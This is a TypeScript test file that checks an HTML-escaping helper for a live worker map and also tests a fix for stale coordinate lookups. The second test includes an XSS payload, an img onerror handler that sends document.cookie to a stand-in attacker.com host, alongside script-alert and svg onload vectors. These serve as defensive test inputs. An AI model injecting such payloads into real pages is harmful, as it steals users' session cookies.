import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { escapeHtml } from './lib/html-utils';

describe('Live Map DOM XSS & Stale Coordinate Remediation Tests (SEC-001 / DEF-002)', () => {
  it('1. escapeHtml safely encodes malicious XSS script payloads in employee names', () => {
    const maliciousScript = '<script>alert("XSS")</script>';
    const escaped = escapeHtml(maliciousScript);
    assert.strictEqual(escaped, '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
    assert.ok(!escaped.includes('<script>'), 'Must not contain unescaped HTML tag');
  });

  it('2. escapeHtml safely encodes img onerror and svg onload event handler vectors', () => {
    const imgPayload = '<img src=x onerror=fetch("https://attacker.com/steal?cookie="+document.cookie)>';
    const escapedImg = escapeHtml(imgPayload);
    assert.ok(!escapedImg.includes('<img'), 'Must escape angle brackets');
    assert.strictEqual(
      escapedImg,
      '&lt;img src=x onerror=fetch(&quot;https://attacker.com/steal?cookie=&quot;+document.cookie)&gt;',
    );

    const svgPayload = '"><svg/onload=alert(1)>';
    const escapedSvg = escapeHtml(svgPayload);
    assert.strictEqual(escapedSvg, '&quot;&gt;&lt;svg/onload=alert(1)&gt;');
  });

  it('3. escapeHtml preserves legitimate alphanumeric names and Unicode strings', () => {
    assert.strictEqual(escapeHtml('Rahul Sharma'), 'Rahul Sharma');
    assert.strictEqual(escapeHtml('Field Technician #42'), 'Field Technician #42');
    assert.strictEqual(escapeHtml('Renée Dupont'), 'Renée Dupont');
    assert.strictEqual(escapeHtml(''), '');
  });

  it('4. Stale closure defense: latest worker map resolves freshest telemetry coordinates', () => {
    // Simulates the latestWorkersRef mechanism implemented in Live Map
    const latestWorkersMap = new Map<string, { userId: string; longitude: number; latitude: number; speed: number }>();

    // Initial worker emission at 09:00 AM (initial mount)
    const initialWorker = { userId: 'usr_01', longitude: 77.1025, latitude: 28.7041, speed: 0 };
    latestWorkersMap.set(initialWorker.userId, initialWorker);

    // Later telemetry update at 09:30 AM
    const updatedWorker = { userId: 'usr_01', longitude: 77.1500, latitude: 28.7500, speed: 12.5 };
    latestWorkersMap.set(updatedWorker.userId, updatedWorker);

    // Click handler reads from latestWorkersMap rather than closed-over initialWorker
    const resolvedWorker = latestWorkersMap.get('usr_01') || initialWorker;
    assert.strictEqual(resolvedWorker.longitude, 77.1500, 'Must resolve latest longitude');
    assert.strictEqual(resolvedWorker.latitude, 28.7500, 'Must resolve latest latitude');
    assert.strictEqual(resolvedWorker.speed, 12.5, 'Must reflect latest speed');
  });
});
